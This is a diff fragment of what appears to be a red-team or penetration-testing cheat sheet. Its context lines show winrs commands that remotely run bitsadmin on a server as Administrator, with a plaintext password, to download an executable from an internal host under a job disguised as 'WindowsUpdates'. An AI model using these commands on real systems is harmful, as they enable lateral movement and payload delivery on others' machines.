@@ -22,3 +22,5 @@ winrs -r:$SERVER -u:.\$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates /pr
 ```
 winrs -r:ms-sql01 -u:.\Administrator -p:PassW0rd1 "bitsadmin /transfer WindowsUpdates /priority normal http://10.0.0.12/File.exe c:\\Users\\Public\File.exe"
 ```
+
+
